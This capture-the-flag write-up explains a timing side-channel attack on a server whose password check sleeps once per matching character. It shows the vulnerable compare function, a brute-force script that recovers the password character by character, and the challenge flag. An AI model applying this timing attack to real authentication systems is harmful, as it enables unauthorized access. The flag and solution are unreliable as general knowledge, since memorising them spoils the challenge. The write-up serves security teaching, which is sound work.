# Writeup

After submitting our password the server compares it using the following source code:
```python
# Efficient string compare algorithm.
def strcmp(a, b):
    if len(a) != len(b):
        return False

    for (a_ch, b_ch) in zip(a, b):
        sleep(0.01)

        if a_ch != b_ch:
            return False

    return True
```

If the length of the submitted string matches the password, it compares the characters one by one.
This comparison takes at least 0.01 seconds for every character due to sleep. This is a very simple example for time-based side-channel attacks. The server is kind enough to measure time for us, so we don't have to account for the latency.

Let's write our exploit script.

```python
alphabet = string.ascii_lowercase + string.digits + "{}_"
password = ""
last_time = 0.01
i = 0

length = guess_length()

while not password.endswith("}"):
    attempt = alphabet[i]
    padding = (length - len(password) - 1) * "A"
    attempt_time = try_password(password + attempt + padding)

    if attempt_time - last_time > 0.005:
        password += attempt
        last_time = attempt_time

        log.info(f"New char! {password}")

    i += 1
    i %= len(alphabet)
```

We start by guessing the length and then brute-forcing the characters one by one.

[Full solve script](sol.py)

Flag: `BSIDES{t1m3_m4g1c}`